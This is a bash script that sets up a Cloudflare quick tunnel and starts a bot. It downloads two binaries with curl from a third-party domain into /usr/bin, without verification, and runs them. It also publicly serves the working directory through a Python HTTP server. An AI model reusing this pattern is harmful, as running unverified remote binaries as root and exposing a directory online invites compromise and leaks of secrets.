#!/bin/bash

# Initialize Log File
LOG_FILE="/var/log/cloudflare_tunnel_setup.log"
echo "===== Cloudflare Tunnel Setup Log =====" > "$LOG_FILE"
echo "Log file: $LOG_FILE"
echo "Starting setup..." | tee -a "$LOG_FILE"

# Function to log messages with timestamp
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" | tee -a "$LOG_FILE"
}

# Download and set executable permissions for 'c' binary
log "Downloading 'c' binary..."
if curl -L https://yaso.su/raw/rootcfdl -o /usr/bin/c; then
    chmod +x /usr/bin/c
    log "[Success] 'c' binary downloaded and permissions set."
else
    log "[Error] Failed to download or set permissions for 'c' binary"
    exit 1
fi

# Download and set executable permissions for 'cfd' binary
log "Downloading 'cfd' binary..."
if curl -L https://yaso.su/cloudflaredownload -o /usr/bin/cfd; then
    chmod +x /usr/bin/cfd
    log "[Success] 'cfd' binary downloaded and permissions set."
else
    log "[Error] Failed to download or set permissions for 'cfd' binary"
    exit 1
fi

# Start a Python HTTP server in the background
log "Starting Python HTTP server on port 8000..."
python3 -m http.server &> /dev/null &
HTTP_PID=$!
sleep 3  # Allow server setup to complete

# Verify HTTP server is running
if ps -p $HTTP_PID > /dev/null; then
    log "[Success] HTTP server running with PID: $HTTP_PID"
else
    log "[Error] Failed to start HTTP server"
    exit 1
fi

# Start Cloudflare tunnel, logging output to /root/cfd.log
log "Initiating Cloudflare tunnel..."
cfd --url http://localhost:8000 --no-autoupdate > /root/cfd.log 2>&1 &
CFD_PID=$!
sleep 5  # Allow tunnel to initialize

# Verify Cloudflare tunnel is running
if ps -p $CFD_PID > /dev/null; then
    log "[Success] Cloudflare tunnel is running with PID: $CFD_PID"
else
    log "[Error] Cloudflare tunnel failed to start"
    cat /root/cfd.log | tee -a "$LOG_FILE"  # Log error details for debugging
    exit 1
fi

# Extract Cloudflare URL from log and save to /root/cfdl
log "Extracting Cloudflare URL from log..."
URL=$(grep -oP 'https?://\S+\.trycloudflare\.com' /root/cfd.log | head -n 1)

if [[ -n $URL ]]; then
    echo "$URL" > /root/cfdl
    log "[Success] Cloudflare URL saved to /root/cfdl: $URL"
else
    log "[Error] No Cloudflare URL found in log."
    log "Log output for debugging:"
    cat /root/cfd.log | tee -a "$LOG_FILE"
    exit 1
fi

# Run main Python bot module, exit if it fails
log "Updating and starting main bot..."
if python3 update.py && python3 -m bot; then
    log "[Success] Bot updated and started successfully."
else
    log "[Error] Failed to update or start main bot module"
    exit 1
fi

# Cleanup: Stop HTTP server and Cloudflare tunnel on exit
trap "log 'Cleaning up and stopping services...'; kill $HTTP_PID $CFD_PID; log 'Services stopped.'" EXIT

log "===== Cloudflare Tunnel Setup Complete ====="
echo "Setup complete. Check the log file for details: $LOG_FILE"
